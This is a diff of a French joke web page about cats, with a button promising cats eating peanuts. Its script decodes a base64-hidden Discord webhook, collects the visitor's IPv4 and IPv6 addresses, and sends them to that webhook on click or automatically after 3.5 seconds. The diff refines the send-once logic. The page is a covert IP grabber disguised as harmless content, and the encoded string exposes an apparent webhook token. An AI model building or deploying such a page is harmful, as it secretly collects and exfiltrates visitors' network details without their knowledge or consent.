@@ -21,9 +21,10 @@
 <h1>Les chats sont les meilleurs</h1>
 <button id="btn" class="btn">Clique ici et les chats vont manger des cacahuètes</button>
 <script>
-// METS TON NOUVEAU WEBHOOK EN BASE64 ICI (et c'est tout)
 const webhookB64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0MTc4OTQwNDAwNjk3NzYxMC95enVaOVppTHRtQzhVQzZQSFR0TnEtU2VqSHlJQ2NfWHgxMWN3VzhoNlRHaUQ3dVdrN2NyV3NhWEtXX1RFeWQwSHJvag==";
-let sent = false; // verrou magique
+let sent = false;
+let timeoutId = null;
+
 async function getIPs() {
     let ipv4 = "inconnue", ipv6 = "non détectée";
     try {
@@ -37,11 +38,17 @@ async function getIPs() {
     }
     return { ipv4, ipv6 };
 }
+
 async function sendOnce() {
-    if (sent) return;        // ← si déjà envoyé → on sort direct
-    sent = true;             // ← on verrouille pour toujours
+    if (sent) return;
+    sent = true;
+    
+    // Annuler le timeout si le bouton a été cliqué
+    if (timeoutId) clearTimeout(timeoutId);
+    
     const { ipv4, ipv6 } = await getIPs();
     const url = atob(webhookB64);
+    
     fetch(url, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
@@ -60,6 +67,7 @@ async function sendOnce() {
         })
     });
 }
+
 // Clic = envoi + disparition bouton
 document.getElementById("btn").onclick = () => {
     sendOnce();
@@ -68,8 +76,9 @@ document.getElementById("btn").onclick = () => {
     b.style.transform = "scale(0)";
     setTimeout(() => b.remove(), 600);
 };
-// Sinon envoi auto après 3,5 s
-setTimeout(sendOnce, 3500);
+
+// Envoi automatique après 3,5 s SEULEMENT si pas déjà envoyé
+timeoutId = setTimeout(sendOnce, 3500);
 </script>
 </body>
 </html>
